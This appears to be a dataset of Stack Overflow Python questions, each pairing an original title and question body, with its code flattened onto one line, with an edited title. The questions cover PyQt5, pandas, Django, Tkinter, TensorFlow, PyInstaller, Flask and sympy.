PyQt5 signal/slot decorator example," I am currently in the process of creating a class that produces a pyqtSignal(int) and pyqtSlot(int). The difficulty lies in creating a signal that emits a specific value.Suppose I want to produce something similar to the following simple example: My first question for the above code is:Why use the pyqtSlot() decorator at all when removing pyqtSlot(int) has no effect on the code?Can you give an example of when it would be necessary?For specific reasons, I would like to produce my own signal using the pyqtSignal() factory and am given decent documentation here. The only problem however, is that the very simple example does not give a solid foundation for how to emit specific signals.Here is what I am trying to do but have found myself lost:Create a metaclass that allows for the implementation of many different types of QWidget subclasses.Have the metaclass produce its own signal that can be called from outside the class.This is what I am going for: As you can see. I give the widget a name because I find this to be useful, and I also try to instantiate the QWidget from within the class to simplify code.This is how I would like a main class to produce the widgets from the first example: There are only 2 problems that need to be solved here:The template metaclass is set up incorrectly, and I am unable to instantiate the QWidget from within the metaclass. The Q_Type is telling me that its type is PyQt5.QtCore.pyqtWrapperType when it should be PyQt5.QtWidgets.QSlider.Even though I am creating a newSignal via the templated class, how do I get the QSlider to send the changed value that I want it to send. I believe this is where emit() comes into play but do not have enough knowledge as to how it is useful.I know I could make some sort of function call self.sld.emit(35) if I would like the signal to pass the value 35 to the slot function. The question becomes not how but where should I implement this function?I may be totally offbase and overthinking the solution, feel free to correct my code so that I can have my signal emit the value of the slider. <code>  import sysfrom PyQt5.QtCore import (Qt, pyqtSignal, pyqtSlot)from PyQt5.QtWidgets import (QWidget, QLCDNumber, QSlider, QVBoxLayout, QApplication)class Example(QWidget): def __init__(self): super().__init__() self.initUI() def printLabel(self, str): print(str) @pyqtSlot(int) def on_sld_valueChanged(self, value): self.lcd.display(value) self.printLabel(value) def initUI(self): self.lcd = QLCDNumber(self) self.sld = QSlider(Qt.Horizontal, self) vbox = QVBoxLayout() vbox.addWidget(self.lcd) vbox.addWidget(self.sld) self.setLayout(vbox) self.sld.valueChanged.connect(self.on_sld_valueChanged) self.setGeometry(300, 300, 250, 150) self.setWindowTitle('Signal & slot') self.show()if __name__ == '__main__': app = QApplication(sys.argv) ex = Example() sys.exit(app.exec_()) from PyQt5.QtWidgets import QPushButton, QWidgetfrom PyQt5.QtCore import pyqtSignal, pyqtSlotfrom PyQt5.QtWidgets import QSliderdef template(Q_Type, name: str, *args): class MyWidget(Q_Type): def __init__(self) -> None: super().__init__(*args) self._name = name def setSignal(self,type): self.signal = pyqtSignal(type) def callSignal(self): pass return MyWidget import sysfrom PyQt5.QtCore import (Qt, pyqtSignal, pyqtSlot)from PyQt5.QtWidgets import (QWidget, QLCDNumber, QSlider, QVBoxLayout, QApplication)class Example(QWidget): def __init__(self): super().__init__() self.initUI() def printLabel(self, str): print(str) @pyqtSlot(int) def sld_valChanged(self, value): self.lcd.display(value) self.printLabel(value) def initUI(self): #instantiate the QWidgets through template class self.lcd = template(QLCDNumber,'lcd_display') self.sld = template(QSlider, 'slider', Qt.Horizontal) #create signal #self.sld.setSignal(int) vbox = QVBoxLayout() vbox.addWidget(self.lcd) vbox.addWidget(self.sld) self.setLayout(vbox) #connect signal - this won't send the value of the slider #self.sld.signal.connect(self.sld_valChanged) self.sld.valueChanged.connect(self.sld_valChanged) self.setGeometry(300, 300, 250, 150) self.setWindowTitle('Signal & slot') self.show()if __name__ == '__main__': app = QApplication(sys.argv) ex = Example() sys.exit(app.exec_())",PyQt5 signal-slot decorator example
Django double curly brace {{, So I was following the Django tutorial and came across this: I am very confused as to what that inner set of curly braces are for. I assumed the outer set was meant to differentiate python from the html django says to put.Could someone please explain to me what the inner set of curly braces are for? <code>  {{ question }},double curly brace {{
"what are the ""func"" options in Python's min/max functions"," I am trying to understand how this works: produces Which is a really cool feature and one I want to understand better.Based on the documentation min(iterable[, key]) Return the smallest item in an iterable or the smallest of two or more arguments... The optional key argument specifies a one-argument ordering function like that used for list.sort(). The key argument, if supplied, must be in keyword form (for example, min(a,b,c,key=func)).Where can I find out more about available functions? In the case of a dictionary, is it all the dictionary methods?Edit: I came across this today: Still looking for information on available keyword functions for min/max <code>  my_dict = {'a':2,'b':1}min(my_dict, key=my_dict.get) b max(enumerate(array_x), key=operator.itemgetter(1))",Keyword functions for Python min/max
Python: Tkinter simple updating progress bar," What is the easy method to update Tkinter progress bar in a loop?I need a solution without much mess, so I can easily implement it in my script, since it's already pretty complicated for me.Let's say the code is: <code>  from Tkinter import *import ttkroot = Tk()root.geometry('{}x{}'.format(400, 100))theLabel = Label(root, text=""Sample text to show"")theLabel.pack()status = Label(root, text=""Status bar:"", bd=1, relief=SUNKEN, anchor=W)status.pack(side=BOTTOM, fill=X)root.mainloop()def loop_function(): k = 1 while k<30: ### some work to be done k = k + 1 ### here should be progress bar update on the end of the loop ### ""Progress: current value of k ="" + str(k)# Begining of a programloop_function()",How to update a progress bar in a loop?
Pandas: how to get rid of `Unnamed:` column in a dataframe," I have a situation wherein sometimes when I read a csv from df I get an unwanted index-like column named unnamed:0. file.csv The CSV is read with this: This is very annoying! Does anyone have an idea on how to get rid of this? <code>  ,A,B,C0,1,2,31,4,5,62,7,8,9 pd.read_csv('file.csv') Unnamed: 0 A B C0 0 1 2 31 1 4 5 62 2 7 8 9","How to get rid of ""Unnamed: 0"" column in a pandas DataFrame read in from CSV file?"
How to get rid of `Unnamed:` column in a pandas dataframe," I have a situation wherein sometimes when I read a csv from df I get an unwanted index-like column named unnamed:0. file.csv The CSV is read with this: This is very annoying! Does anyone have an idea on how to get rid of this? <code>  ,A,B,C0,1,2,31,4,5,62,7,8,9 pd.read_csv('file.csv') Unnamed: 0 A B C0 0 1 2 31 1 4 5 62 2 7 8 9","How to get rid of ""Unnamed: 0"" column in a pandas DataFrame read in from CSV file?"
"How to get rid of ""Unnamed: 0"" column in a pandas DataFrame?"," I have a situation wherein sometimes when I read a csv from df I get an unwanted index-like column named unnamed:0. file.csv The CSV is read with this: This is very annoying! Does anyone have an idea on how to get rid of this? <code>  ,A,B,C0,1,2,31,4,5,62,7,8,9 pd.read_csv('file.csv') Unnamed: 0 A B C0 0 1 2 31 1 4 5 62 2 7 8 9","How to get rid of ""Unnamed: 0"" column in a pandas DataFrame read in from CSV file?"
How to get the count of an element in a tensor," I want to get the count of an element in a tensor, for example, t = [1, 2, 0, 0, 0, 0] (t is a tensor). I can get the amount 4 of zeros by calling t.count(0) in Python, but in TensorFlow, I can't find any functions to do this. How can I get the count of zeros? <code> ",How to get the count of an element in a tensor in TensorFlow?
Assignning string with boolean expression," I am trying to understand this code from someone else's project. If you want the context it's here: https://github.com/newsapps/beeswithmachineguns/blob/master/beeswithmachineguns/bees.py#L501IS_PY2 is just a boolean variable, True if the Python major version is 2.I know that a non-empty string is True, but for some reason I don't understand openmode is assigned either 'w' or 'wt' rather than True or False. Could someone explain the result? <code>  openmode = IS_PY2 and 'w' or 'wt'openkwargs = IS_PY2 and {} or {'encoding': 'utf-8', 'newline': ''}",Assigning string with boolean expression
Python set vs. frozenset performance," I was tinkering around with Python's set and frozenset collection types.Initially, I assumed that frozenset would provide a better lookup performance than set, as its immutable and thus could exploit the structure of the stored items.However, this does not seem to be the case, regarding the following experiment: I executed this code using both CPython and PyPy, which gave the following results: It seems that frozenset is actually slower regarding the lookup performance, both in CPython and in PyPy. Does anybody have an idea why this is the case? I did not look into the implementations. <code>  import randomimport timeimport sysdef main(n): numbers = [] for _ in xrange(n): numbers.append(random.randint(0, sys.maxint)) set_ = set(numbers) frozenset_ = frozenset(set_) start = time.time() for number in numbers: number in set_ set_duration = time.time() - start start = time.time() for number in numbers: number in frozenset_ frozenset_duration = time.time() - start print ""set : %.3f"" % set_duration print ""frozenset: %.3f"" % frozenset_durationif __name__ == ""__main__"": n = int(sys.argv[1]) main(n) > pypy set.py 100000000set : 6.156frozenset: 6.166> python set.py 100000000set : 16.824frozenset: 17.248",Set vs. frozenset performance
It is possible to get pip to print the configuration it is using?, Is there any way to get pip to print the config it will attempt to use? For debugging purposes it would be very nice to know that:config.ini files are in the correct place and pip is finding them.The precedence of the config settings is treated in the way one would expect from the docs <code> ,Is it possible to get pip to print the configuration it is using?
Spliting a python list into a list of sub-lists," This question is similar to Slicing a list into a list of sub-lists, but in my case I want to include the last element of the each previous sub-list, as the first element in the next sub-list. And have to take into account that the last element have always to have at least two elements.For example: The result for a size 3 sub-list: <code>  list_ = ['a','b','c','d','e','f','g','h'] resultant_list = [['a','b','c'],['c','d','e'],['e','f','g'],['g','h']]",Splitting a Python list into a list of overlapping chunks
Splitting a python list into a list of overlapping chunks," This question is similar to Slicing a list into a list of sub-lists, but in my case I want to include the last element of the each previous sub-list, as the first element in the next sub-list. And have to take into account that the last element have always to have at least two elements.For example: The result for a size 3 sub-list: <code>  list_ = ['a','b','c','d','e','f','g','h'] resultant_list = [['a','b','c'],['c','d','e'],['e','f','g'],['g','h']]",Splitting a Python list into a list of overlapping chunks
Convert csc_matrix to pandas dataframe," I want to convert this matrix into a pandas dataframe.csc_matrixThe first number in the bracket should be the index, the second number being columns and the number in the end being the data.I want to do this to do feature selection in text analysis, the first number represents the document, the second being the feature of word and the last number being the TFIDF score.Getting a dataframe helps me to transform the text analysis problem into data analysis. <code> ",Convert sparse matrix (csc_matrix) to pandas dataframe
How to divide two column in a dataframe," I have two columns in my pandas dataframe. I'd like to divide column A by column B, value by value, and show it as follows: The columns: And the expected result: How do I do this? <code>  import pandas as pdcsv1 = pd.read_csv('auto$0$0.csv')csv2 = pd.read_csv('auto$0$8.csv')df1 = pd.DataFrame(csv1, columns=['Column A', 'Column B'])df2 = pd.DataFrame(csv2, columns=['Column A', 'Column B'])dfnew = pd.concat([df1, df2]) Column A Column B12 214 716 820 5 Result6224",How to divide two columns element-wise in a pandas dataframe
How to list the packages corresponding to imports?, Is there a way to list the PyPi package names which correspond to modules being imported in a script?For instance to import the module scapy3k (this is its name) I need to use but the actual package to install is scapy-python3. The latter is what I am looking to extract from what I will find in the import statement (I do not care about its name - scapy3k in that case).There are other examples (which escape me right now) of packages which have a pip install name completely different from what is being used in the import afterwards. <code>  import scapy.all,How to list the names of PyPI packages corresponding to imports in a script?
How to list the names of PyPI packages corresponding to imports inside a module?, Is there a way to list the PyPi package names which correspond to modules being imported in a script?For instance to import the module scapy3k (this is its name) I need to use but the actual package to install is scapy-python3. The latter is what I am looking to extract from what I will find in the import statement (I do not care about its name - scapy3k in that case).There are other examples (which escape me right now) of packages which have a pip install name completely different from what is being used in the import afterwards. <code>  import scapy.all,How to list the names of PyPI packages corresponding to imports in a script?
Persist UTF8 as default enconding Python," I tried to persist UTF-8 as the default encoding in Python.I tried: And I also tried: But after closing the session and opening a new session, the following was the result: How can I persist my changes? (I know that it's not always a good idea to change to UTF-8. It's in a Docker container of Python).I know it's possible. I saw someone who has UTF-8 as his default encoding (always). <code>  >>> import sys>>> sys.getdefaultencoding()'ascii' >>> import sys>>> reload(sys)<module 'sys' (built-in)>>>> sys.setdefaultencoding('UTF8')>>> sys.getdefaultencoding()'UTF8'>>> >>> import sys>>> sys.getdefaultencoding()'ascii'",Persist UTF-8 as Default Encoding
Persist UTF-8 as default encoding," I tried to persist UTF-8 as the default encoding in Python.I tried: And I also tried: But after closing the session and opening a new session, the following was the result: How can I persist my changes? (I know that it's not always a good idea to change to UTF-8. It's in a Docker container of Python).I know it's possible. I saw someone who has UTF-8 as his default encoding (always). <code>  >>> import sys>>> sys.getdefaultencoding()'ascii' >>> import sys>>> reload(sys)<module 'sys' (built-in)>>>> sys.setdefaultencoding('UTF8')>>> sys.getdefaultencoding()'UTF8'>>> >>> import sys>>> sys.getdefaultencoding()'ascii'",Persist UTF-8 as Default Encoding
Run specific unit tests in python from main()," I am trying to run only a single test from the unit tests provided in a class. So assuming I would like to run only test_false. Based on the Q&A provided on this site and online, I used the following lines of code in my main class I keep getting errors while trying to add the test. Mainly:File ""C:\Python27\Lib\unittest\case.py"", line 189, in init (self.class, methodName)) ValueError: no such test method in <class 'main.MytestSuite'>: runTestDo I need a specific runTest method in my class? Is there a way to run particular tests that may belong to different suites? For example, method A belonging to suite class 1 and method B belonging to suite class 2. Surprisingly this has proven to be a difficult thing to find online. There are multiple examples of doing it through the command line, but not from the program itself. <code>  class MytestSuite(unittest.TestCase): def test_false(self): a = False self.assertFalse(a, ""Its false"") def test_true(self): a = True self.assertTrue(a, ""Its true"") if __name__ == ""__main__"": # Indentation was wrong singletest = unittest.TestSuite() singletest.addTest(MytestSuite().test_false) unittest.TextTestRunner().run(singletest)",Run a specific unit tests in Python from main()
Subclassing a type defined in a C module," I am subclassing a type defined in a C module to alias some attributes and methods so that my script works in different contexts. How is it that to get this to work, I have to tweak the dictionary of my class manually ? If I don't add a reference to DistanceTo in the dictionnary, I get Point3d has no attribute named DistanceTo. I was thinking that once __new__ had returned an instance I could still populate it with methods and attributes. Can anyone shed some light on this ?EDIT : The module I import from is FreeCAD. The C base type is defined there. Then Vector is derived form this definition hereEDIT2 : I also tried the following : and after creating a second point, both Point3d p returns the value of the last point for p.X, p.Y and p.Z no matter what x,y,z parameters were passed at the creation of the instance. p.x, p.y, p.z return the expected values. It seems to indicate that the dictionary is shared between instances. EDIT 3 : Problem solved ! The Py_TPFLAGS_BASETYPE bit is set to zero to prevent subclassing as explained in the answer below. <code>  class Point3d(App.Base.Vector): def __new__(cls, x, y, z): obj = super(Point3d, cls).__new__(cls) obj.x, obj.y, obj.z = x, y, z obj.__dict__.update({ 'X':property(lambda self: self.x), 'Y':property(lambda self: self.y), 'Z':property(lambda self: self.z), 'DistanceTo':lambda self, p: self.distanceToPoint(p)}) return obj def DistanceTo(self, p): return self.distanceToPoint(p) class Point3d(App.Base.Vector): def __new__(cls, x, y, z): obj = super(Point3d, cls).__new__(cls) obj.x, obj.y, obj.z = x, y, z obj.__dict__.update({ 'X': x, 'Y': y, 'Z': z, 'DistanceTo':lambda self, p: self.distanceToPoint(p)}) return obj def DistanceTo(self, p): return self.distanceToPoint(p)",Method ignored when subclassing a type defined in a C module
Computing tfidf scores for two columns using sklearn," I'm trying to compute the similarity between a set of queries and a set a result for each query. I would like to do this using tfidf scores and cosine similarity. The issue that I'm having is that I can't figure out how to generate a tfidf matrix using two columns (in a pandas dataframe). I have concatenated the two columns and it works fine, but it's awkward to use since it needs to keep track of which query belongs to which result. How would I go about calculating a tfidf matrix for two columns at once? I'm using pandas and sklearn.Here's the relevant code: I'm trying to pass df_all['search_term'] and df_all['product_title'] as arguments into tf.fit_transform. This clearly does not work since it just concatenates the strings together which does not allow me to compare the search_term to the product_title. Also, is there maybe a better way of going about this? <code>  tf = TfidfVectorizer(analyzer='word', min_df = 0)tfidf_matrix = tf.fit_transform(df_all['search_term'] + df_all['product_title']) # This line is the issuefeature_names = tf.get_feature_names() ",Computing separate tfidf scores for two different columns using sklearn
Queryset has no effect with PrimaryKeyRelatedField," So I have a serializer that looks like this and it works great produces but if I change the queryset in the serializer to I still get the same exact result back. Is this supposed to be happening? Am I using querysets incorrectly?I used [] as an easy example to show that no matter what I put in nothing changes.Please any insight would be invaluable It should be noted that masterlistings has a primary key relationship that points to buildings. So a masterlisting belong to a building.  <code>  class BuildingsSerializer(serializers.ModelSerializer): masterlisting_set = serializers.PrimaryKeyRelatedField(many=True, queryset=Masterlistings.objects.all()) serializer = BuildingsSerializer(Buildings.objects.get(pk=1))serializer.data OrderedDict([ (""masterlistings_set"", [ ""0a06e3d7-87b7-4526-a877-c10f54fa5bc9"", ""343643ac-681f-4597-b8f5-ff7e5be65eef"", ""449a3ad2-c76c-4cb8-bb86-1be72fafcf64"", ])]) class BuildingsSerializer(serializers.ModelSerializer): masterlistings_set = serializers.PrimaryKeyRelatedField(many=True, queryset=[]) OrderedDict([ (""masterlistings_set"", [ ""0a06e3d7-87b7-4526-a877-c10f54fa5bc9"", ""343643ac-681f-4597-b8f5-ff7e5be65eef"", ""449a3ad2-c76c-4cb8-bb86-1be72fafcf64"", ])])",Django-REST Serializer: Queryset does not filter PrimaryKeyRelatedField results
Python openpyxl select sheet," I am writing some data into an Excel file, but I dont know how to adjust the code in order to be able to control which sheet I am writing into: Instead of wb.active, how can I say something like Sheets('Data') (this is how the VBA syntax would look like...)? <code>  wb = load_workbook(filename)active_ws = wb.active",openpyxl get sheet by name
How to define format when use pandas to_datetime?," I want to plot RESULT vs TIME based on a testresult.csv file that has following format, and I have trouble to get the TIME column's datatype defined properly. To read the csv file, this is the code I wrote:raw_df = pd.read_csv('testresult.csv', index_col=None, parse_dates=['TIME'], infer_datetime_format=True)This code works, but it is extremely slow, and I assume that the infer_datetime_format takes time. So I tried to read in the csv by default first, and then convert the object dtype 'TIME' to datetime dtype by using to_datetime(), and I hope by defining the format, it might expedite the speed. This code complained error:""ValueError: '-' is a bad directive in format '%m/%d%Y %-I%M%S %p'"" <code>  TIME,RESULT 03/24/2016 12:27:11 AM,2 03/24/2016 12:28:41 AM,76 03/24/2016 12:37:23 AM,19 03/24/2016 12:38:44 AM,68 03/24/2016 12:42:02 AM,44 ... raw_df = pd.read_csv('testresult.csv')raw_df.loc['NEWTIME'] = pd.to_datetime(raw_df['TIME'], format='%m/%d%Y %-I%M%S %p')",How to define format when using pandas to_datetime?
Order in legent plots python," I need to plot multiple sets of data on the same plot, and I use matplotlib. For some of plots I use plt.plot() and for the others I use plt.errorbar(). But when I make a legend the ones created with plt.plot() appears first, no matter in which order I put them in the file (and zorder seems to have no effect on the position in the legend). How can I give the order that I want in the legend, regardless of the way I plot the data? <code> ",Order in legend plots python
Python - Sympy - Piecewise - How to define propper piecewise function without TypeError," I have the following code: which results into a Error: What is the proper way to define this function? I need sympy for this because I plan to integrate it later. <code>  l = 2h = 1p = 2q = -2x = Symbol('x')f = Piecewise ( (0, x < 0), (p, 0 <= x <= l/3), (h/l * x - h, l/3 < x < 2*l/3), (q, 2*l/3 <= x <= l), (0, x > l)) TypeError: cannot determine truth value of Relational","How to define a piecewise function without ""TypeError: cannot determine truth value"""
What does Python mean by [...]?," I'm printing a value of a what I thought was a list, but the output that I get is: What does this represent? How do I test for it? I've tried: and but no dice...Here's a cutdown of the code that's giving the issue: totalPaths contains a LOT of [...] supposedly recursive lists, but I can't see why. I've altered the test at #test to prevent this.I've also tried: in order to explicitly return None for empty paths. <code>  [...] myVar.__repr__() != '[...]' myVar.__repr_() != Ellipsis def buildPaths(graph, start, end, path=[], totalPaths=[]): """""" returns list of all possible paths from start node to the end node """""" path = path + [start] if start == end: return path for nextNode in graph.childrenOf(start): if nextNode not in path: newPath = buildPaths(graph, nextNode, end, path, totalPaths) if newPath != []: # test totalPaths.append(newPath) return totalPaths def buildPaths(graph, thisNode, end, path=[], totalPaths=None): """""" returns list of all possible paths from start node to the end node """""" path = path + [thisNode] if thisNode == end: return path for nextNode in graph.childrenOf(thisNode): if nextNode not in path: newPath = buildPaths(graph, nextNode, end, path, totalPaths) if newPath != None: if totalPaths == None: totalPaths = [newPath] else: totalPaths.append(newPath) return totalPaths","What does Python mean by printing ""[...]"" for an object reference?"
Python pairwise circular for loop?," Is there a nice Pythonic way to loop over a list, retuning a pair of elements? The last element should be paired with the first.So for instance, if I have the list [1, 2, 3], I would like to get the following pairs:1 - 22 - 33 - 1 <code> ",Pairwise circular Python 'for' loop
Pyspark replace substring in Spark dataframe column," I'd like to perform some basic stemming on a Spark Dataframe column by replacing substrings. What's the quickest way to do this? In my current use case, I have a list of addresses that I want to normalize. For example this dataframe: Would become <code>  id address1 2 foo lane2 10 bar lane3 24 pants ln id address1 2 foo ln2 10 bar ln3 24 pants ln",Pyspark replace strings in Spark dataframe column
python import multiple tiumes," I suppose this is a general question so sorry if not posted in the right place.Say for instance, I have a function a which imports os. If I was to call this function from another file multiple times I am assuming that the import would be done multiple times as well? Is there a way to only import the module if its not already present?Basically, I have a class which calls multiple functions imported from various files, instead of importing the whole file I thought it would be easier to import just the function but now I am wondering if I am going to give myself headaches in the long run with excess imports. <code> ",python import multiple times
Why the debugger doesn't work?," I cannot debug a Flask application in PyCharm. The application should run on port 5000: app.run(host=""10.1.0.17"", port=5000, debug=True). The console output is: I am using Python 3.5.1. What could be wrong? <code>  C:\Python\python.exe ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"" --multiproc --qt-support --client 127.0.0.1 --port 10498 --file ""D:/TGM/SMS/SMS/Back .v2/wsgi.py""pydev debugger: process 4108 is connectingCould not connect to 127.0.0.1: 10499Traceback (most recent call last): File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"", line 1523, in <module> debugger.connect(host, port) File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"", line 317, in connect self.initialize_network(s) File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"", line 304, in initialize_network self.writer = WriterThread(sock) File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\_pydevd_bundle\pydevd_comm.py"", line 392, in __init__ self.cmdQueue = _queue.Queue()AttributeError: module 'queue' has no attribute 'Queue'Process finished with exit code -1",PyCharm debugger fails with AttributeError
"PyCharm debugger fails, no attribute 'Queue'"," I cannot debug a Flask application in PyCharm. The application should run on port 5000: app.run(host=""10.1.0.17"", port=5000, debug=True). The console output is: I am using Python 3.5.1. What could be wrong? <code>  C:\Python\python.exe ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"" --multiproc --qt-support --client 127.0.0.1 --port 10498 --file ""D:/TGM/SMS/SMS/Back .v2/wsgi.py""pydev debugger: process 4108 is connectingCould not connect to 127.0.0.1: 10499Traceback (most recent call last): File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"", line 1523, in <module> debugger.connect(host, port) File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"", line 317, in connect self.initialize_network(s) File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\pydevd.py"", line 304, in initialize_network self.writer = WriterThread(sock) File ""C:\Program Files (x86)\JetBrains\PyCharm 145.597.11\helpers\pydev\_pydevd_bundle\pydevd_comm.py"", line 392, in __init__ self.cmdQueue = _queue.Queue()AttributeError: module 'queue' has no attribute 'Queue'Process finished with exit code -1",PyCharm debugger fails with AttributeError
"PyQt4 script frozen by PyInstaller gives Fatal Error:""Failed to execute script pyi_rth_qt4plugins"""," I am writing the following Python 3.5 script: I create executable using PyInstaller. It runs normally. Though when I try to run the executable on a different PC (which has no Python installed) than mine, it gives the following Fatal Error Message: ""Failed to execute script [script-name]"".If someone has an idea how I can make my GUI programms portable, please leave a comment. Otherwise, if what I have in my mind cannot be done, please let me know.Windows10 (64 bit), Python 3.5(32 bit), PyInstaller(3.2), PyQt4 <code>  import sysfrom PyQt4 import QtGuiclass Window(QtGui.QMainWindow): def __init__(self): super().__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle(""HelloGUI"") self.show()def run(): app = QtGui.QApplication(sys.argv) win = Window() sys.exit(app.exec_())run()","PyQt4 script frozen by PyInstaller gives Fatal Error:""Failed to execute script xyz"""
"Python ""in"" check"," As I am going through tutorials on Python 3, I came across the following: My understanding is that '' equals no blank spaces.When I try the following the shell terminal, I get the output shown below it: Can someone please help explain what is happening? <code>  >>> '' in 'spam'True >>> '' in ' spam 'True","""IN"" operator with empty strings in Python 3.0"
in operator with empty strings," As I am going through tutorials on Python 3, I came across the following: My understanding is that '' equals no blank spaces.When I try the following the shell terminal, I get the output shown below it: Can someone please help explain what is happening? <code>  >>> '' in 'spam'True >>> '' in ' spam 'True","""IN"" operator with empty strings in Python 3.0"
what's the difference between two implentations of RNN in tensorflow," I find two kinds of implementations of RNN in tensorflow.The first implementations is this (from line 124 to 129). It uses a loop to define each step of input in RNN. The second implementation is this (from line 51 to 70). It doesn't use any loop to define each step of input in RNN. In the first implementation, I find there is no weight matrix between input unit to hidden unit, only define weight matrix between hidden unit to out put unit (from line 132 to 133).. But in the second implementation, both of the weight matrices are defined (from line 42 to 47). I wonder why? <code>  with tf.variable_scope(""RNN""): for time_step in range(num_steps): if time_step > 0: tf.get_variable_scope().reuse_variables() (cell_output, state) = cell(inputs[:, time_step, :], state) outputs.append(cell_output) states.append(state) def RNN(_X, _istate, _weights, _biases): # input shape: (batch_size, n_steps, n_input) _X = tf.transpose(_X, [1, 0, 2]) # permute n_steps and batch_size # Reshape to prepare input to hidden activation _X = tf.reshape(_X, [-1, n_input]) # (n_steps*batch_size, n_input) # Linear activation _X = tf.matmul(_X, _weights['hidden']) + _biases['hidden'] # Define a lstm cell with tensorflow lstm_cell = rnn_cell.BasicLSTMCell(n_hidden, forget_bias=1.0) # Split data because rnn cell needs a list of inputs for the RNN inner loop _X = tf.split(0, n_steps, _X) # n_steps * (batch_size, n_hidden) # Get lstm cell output outputs, states = rnn.rnn(lstm_cell, _X, initial_state=_istate) # Linear activation # Get inner loop last output return tf.matmul(outputs[-1], _weights['out']) + _biases['out'] output = tf.reshape(tf.concat(1, outputs), [-1, size]) softmax_w = tf.get_variable(""softmax_w"", [size, vocab_size]) softmax_b = tf.get_variable(""softmax_b"", [vocab_size]) logits = tf.matmul(output, softmax_w) + softmax_b weights = { 'hidden': tf.Variable(tf.random_normal([n_input, n_hidden])), # Hidden layer weights 'out': tf.Variable(tf.random_normal([n_hidden, n_classes]))}biases = { 'hidden': tf.Variable(tf.random_normal([n_hidden])), 'out': tf.Variable(tf.random_normal([n_classes]))}",What's the difference between two implementations of RNN in tensorflow?
Passing variables from flask to javascript," I looked at similar forums but was not able to get any of the solutions to work. I am trying to pass variables from Flask to my JavaScript file. These values then will be used for PubNub from my JavaScript file. Here is part of my Python code: Here is part of my JavaScript code (app.js): this code works if I use it in my Settings.html file but not in the app.js file. <code>  @app.route(""/mysettings/"")def user_settings(): return render_template('Settings.html', project_name = session['project_name'] , publish_key = session['publish_key'] , subscribe_key = session['subscribe_key'] ) var settings = { channel: {{project_name}}, publish_key: {{publish_key}}, subscribe_key: {{subscribe_key}} };",Passing variables from Flask to JavaScript
How to extract elements from a matrix using a vector of indices using numpy?," Suppose I have a matrix A of order mn and a vector of order m1. I would like to extract elements from each row of the matrix A by using the elements of the vector as an offset in each row.For example, and a vector What I want to achieve is a way to extract the elements of A such that each element of the vector indexes an element in the corresponding row of A, i.e., implementing without the use of any explicit loops.The expected output is, I am using Python and the NumPy library. <code>  A = [[3, 0, 0, 8, 3], [9, 3, 2, 2, 6], [5, 5, 4, 2, 8], [3, 8, 7, 1, 2], [3, 9, 1, 5, 5]] y = [4, 2, 1, 3, 2] for i in range(len(y)): A[i, y[i]] = #perform operations here [3, 2, 5, 1, 1]",How to extract elements from a matrix using a vector of indices?
"Cross-platform, save to use command line string separator"," For a new feature in PyInstaller, we need a command line option receiving a string with any separator in it. Here's the discussion: https://github.com/pyinstaller/pyinstaller/pull/1990.Example: ? is the separator here, this should be another character. It's not guaranteed, that the string is quoted!We've thought about ; : > < | * and so on, but we can't figure out what character would be save to use, without side effects and platform independent (and hopefully not allowed in paths). > e.g will redirect stdout, ; is the command separator on POSIX ect.Any ideas what character we can use?  <code>  pyinstaller --add-data=""file.txt?dir""","Cross-platform, safe to use command line string separator"
"Cross-platform, save to use command line string separator - New PyInstaller feature"," For a new feature in PyInstaller, we need a command line option receiving a string with any separator in it. Here's the discussion: https://github.com/pyinstaller/pyinstaller/pull/1990.Example: ? is the separator here, this should be another character. It's not guaranteed, that the string is quoted!We've thought about ; : > < | * and so on, but we can't figure out what character would be save to use, without side effects and platform independent (and hopefully not allowed in paths). > e.g will redirect stdout, ; is the command separator on POSIX ect.Any ideas what character we can use?  <code>  pyinstaller --add-data=""file.txt?dir""","Cross-platform, safe to use command line string separator"
"Cross-platform, save to use command line string separator"," For a new feature in PyInstaller, we need a command line option receiving a string with any separator in it. Here's the discussion: https://github.com/pyinstaller/pyinstaller/pull/1990.Example: ? is the separator here, this should be another character. It's not guaranteed, that the string is quoted!We've thought about ; : > < | * and so on, but we can't figure out what character would be save to use, without side effects and platform independent (and hopefully not allowed in paths). > e.g will redirect stdout, ; is the command separator on POSIX ect.Any ideas what character we can use?  <code>  pyinstaller --add-data=""file.txt?dir""","Cross-platform, safe to use command line string separator"
high-dimensional data strucutre in Python," What is best way to store and analyze high-dimensional date in python? I like Pandas DataFrame and Panel where I can easily manipulate the axis. Now I have a hyper-cube (dim >=4) of data. I have been thinking of stuffs like dict of Panels, tuple as panel entries. I wonder if there is a high-dim panel thing in Python. update 20/05/16: Thanks very much for all the answers. I have tried MultiIndex and xArray, however I am not able to comment on any of them. In my problem I will try to use ndarray instead as I found the label is not essential and I can save it separately.update 16/09/16:I came up to use MultiIndex in the end. The ways to manipulate it are pretty tricky at first, but I kind of get used to it now. <code> ",High-dimensional data structure in Python
Linear regression with panda time series," I have a dataframe object which contains 1 seconds intervals of the EUR_USD currency pair. But in theory it could be any interval and in this case it could look like this: I'd like to use linear regression to draw a trend line from the data in dataframe, but I'm not sure what the best way are to do that with time series, and even such a small interval of time series.So far I've messed around by replacing the time by (and this is just to show where I'd like to go with it) a list ranging from 0 to the time series list length. Using numpy to do the math magic Lastly I draw the function along with the df[""closeAsk""] to make sense of the trend. However now the x-axis is just meaningless numbers, instead I'd like for them to show the time series. <code>  2015-11-10 01:00:00+01:00 1.076162015-11-10 01:01:00+01:00 1.076052015-11-10 01:02:00+01:00 1.075902015-11-10 01:03:00+01:00 1.075922015-11-10 01:04:00+01:00 1.07583 x = list(range(0, len(df.index.tolist()), 1))y = df[""closeAsk""].tolist() fit = np.polyfit(x,y,1)fit_fn = np.poly1d(fit) plt.plot(x,df[""closeAsk""], '-')plt.plot(x,y, 'yo', x, fit_fn(x), '--k')plt.show()",Linear regression with pandas time series
